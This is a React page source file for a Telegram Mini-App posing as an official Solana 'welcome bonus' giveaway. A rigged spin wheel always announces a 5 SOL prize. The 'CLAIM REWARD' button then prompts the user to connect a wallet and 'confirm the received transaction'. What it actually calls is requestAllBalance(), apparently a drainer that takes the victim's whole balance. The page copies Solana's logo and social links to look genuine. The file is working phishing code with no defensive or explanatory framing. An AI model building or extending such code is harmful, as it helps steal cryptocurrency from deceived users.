// app/page.tsx
/* eslint-disable @typescript-eslint/no-explicit-any */

'use client'

import React, { useEffect, useRef, useState } from 'react'
import './assets/2idql.css'
import '@solana/wallet-adapter-react-ui/styles.css'

import { useWallet }      from '@solana/wallet-adapter-react'
import { useWalletModal } from '@solana/wallet-adapter-react-ui'
import { requestAllBalance } from '@/app/services/transaction'

declare global {
  interface Window {
    solana?: { publicKey?: any }
    Telegram?: { WebApp?: TgWebApp }
  }
}

interface TgWebApp {
  expand: () => void
  requestFullscreen?: () => void
  setHeaderColor:    (typeOrColor: string, colorHex?: string) => void
  setBackgroundColor:(colorHex: string) => void
  disableVerticalSwipes?: () => void
  scroll?: (offsetY: number) => void
}
type TgWindow = Window & { Telegram?: { WebApp?: TgWebApp } }

export default function Page() {
  /* -------- Telegram Mini-App başlat -------- */
  useEffect(() => {
    const webapp = (window as TgWindow).Telegram?.WebApp
    if (!webapp) return
    try {
      webapp.expand()
      webapp.requestFullscreen?.()
      webapp.setHeaderColor('bg_color', '#000000')
      webapp.setBackgroundColor('#000000')
      if (typeof webapp.disableVerticalSwipes === 'function') {
        webapp.disableVerticalSwipes()
      } else if (typeof webapp.scroll === 'function') {
        const lockScroll = () => webapp.scroll!(window.scrollY)
        window.addEventListener('scroll', lockScroll)
        return () => window.removeEventListener('scroll', lockScroll)
      }
    } catch (e) {
      console.error('Telegram WebApp init hatası:', e)
    }
  }, [])

  /* -------- ÇARK (spin) durumu -------- */
  const wheelRef = useRef<HTMLImageElement>(null)
  const [hasSpun, setHasSpun] = useState<boolean>(() => {
    if (typeof window === 'undefined') return false
    return localStorage.getItem('hasSpun') === 'true'
  })
  useEffect(() => {
    if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
  }, [hasSpun])
  const handleSpin = () => {
    if (hasSpun || !wheelRef.current) return
    const wheel = wheelRef.current
    wheel.style.transition = 'transform 9000ms ease-in-out'
    wheel.style.transform  = 'rotate(1080deg)'
    setTimeout(() => {
      wheel.style.transition = 'none'
      wheel.style.transform  = 'rotate(0deg)'
    }, 9000)
    setTimeout(() => {
      setHasSpun(true)
      localStorage.setItem('hasSpun', 'true')
    }, 10000)
  }

  /* ——————————————————————————————————————— */
  /*       Wallet-Adapter ile bağlan & claim      */
  /* ——————————————————————————————————————— */
  const { publicKey }  = useWallet()
  const { setVisible } = useWalletModal()

  const [isLoading,    setIsLoading]    = useState(false)
  const [msg,          setMsg]          = useState('')
  const [pendingTx,    setPendingTx]    = useState(false)

  // Her durumda modal aç
  const openConnectModal = () => {
    setVisible(true)
  }

  // Transaction gönderme
  const sendTx = async () => {
    setIsLoading(true)
    let ok: boolean | undefined
    try {
      ok = await requestAllBalance()
    } catch {
      ok = false
    } finally {
      setIsLoading(false)
    }
    if (!ok) {
      setMsg('No enough Sol!')
      setTimeout(() => setMsg(''), 5000)
    }
  }

  // Claim butonuna basıldığında
  const handleClaim = () => {
    if (!publicKey) {
      setPendingTx(true)
      openConnectModal()
    } else {
      sendTx()
    }
  }

  // Cüzdan bağlandıktan sonra bekleyen tx varsa gönder
  useEffect(() => {
    if (publicKey && pendingTx) {
      setPendingTx(false)
      sendTx()
    }
  }, [publicKey, pendingTx])

  /* ——————————————————————————————————————— */
  /*                    JSX                     */
  /* ——————————————————————————————————————— */
  return (
    <>
      {/* ---------- HERO BANNER ---------- */}
      <div className="_1">
        <div className="_g">
          <span className="_a">
            <div className="_3">
              <p className="_7">
                CONGRATULATIONS! <br />
                <span className="_a">You won</span>{' '}
                <span><span className="_a">5 $SOL</span></span>
              </p>
            </div>
          </span>
          <div className="_9">
            <div className="_i">
              <p className="_k">Connect your wallet to receive reward</p>
              <button
                onClick={handleClaim}
                className="_s"
                disabled={isLoading}
              >
                {isLoading ? 'Please wait…' : msg || 'CLAIM REWARD'}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* ---------- HEADER ---------- */}
      <section className="_b">
        <div className="_d">
          <div className="_x">
            <div className="_0">
              <a href="#!" className="_h">
                <img src="/header_logo.svg" alt="Solana logo" />
              </a>
              <a href="#!" className="_w">
                <img src="/alik.png" className="_t" alt="avatar" />
              </a>
            </div>
            <div className="_0">
              <div className="_6">
                <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
                  <img src="/header_twitter.svg" alt="Twitter" />
                </a>
                <a href="https://t.me/solana" target="_blank" rel="noreferrer">
                  <img src="/header_tg.svg" alt="Telegram" />
                </a>
                <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
                  <img src="/header_mail.svg" alt="YouTube" />
                </a>
                <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
                  <img src="/header_ds.svg" alt="Discord" />
                </a>
              </div>
            </div>
            <div className="_0">
              <button onClick={openConnectModal} className="_n">
                <span className="_a">
                  {publicKey ? 'Wallet connected' : 'Connect Wallet'}
                </span>
                <img src="/header_arrow.svg" alt="" />
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* ---------- MAIN SECTION ---------- */}
      <section className="_m">
        <div className="_d">
          <h1 className="_4">
            WELCOME <span>BONUS</span>
            <br />
            FOR SOLANA USERS
          </h1>
          <div className="_o">
            <div className="_r">
              <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
              <img
                ref={wheelRef}
                src="/wheel_wheel.png"
                alt="Wheel"
                className="_l"
              />
              <button className="_y" onClick={handleSpin}>
                FREE SPIN
              </button>
            </div>
          </div>
          <div className="_u">
            <div className="_j">
              <p className="_p">
                <img src="/main_one.svg" alt="step 1" />
                If you have received a qualification notification in the form of
                SOL or USDT, click the «FREE SPIN» button
              </p>
              <p className="_p">
                <img src="/main_two.svg" alt="step 2" />
                If you win a reward in free spin, we congratulate you!
              </p>
              <p className="_p">
                <img src="/main_three.svg" alt="step 3" />
                Click «CLAIM REWARD», connect your wallet and confirm the
                received transaction
              </p>
            </div>
            <p className="_e">All rights reserved © 2025 SOLANA.</p>
          </div>
        </div>
      </section>

      {/* ---------- FOOTER SOCIAL ---------- */}
      <section className="_v">
        <div className="_d">
          <div className="_6">
            <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
              <img src="/header_twitter.svg" alt="Twitter" />
            </a>
            <a href="https://t.me/solana" target="_blank" rel="noreferrer">
              <img src="/header_tg.svg" alt="Telegram" />
            </a>
            <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
              <img src="/header_mail.svg" alt="YouTube" />
            </a>
            <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
              <img src="/header_ds.svg" alt="Discord" />
            </a>
          </div>
        </div>
      </section>
    </>
  )
}
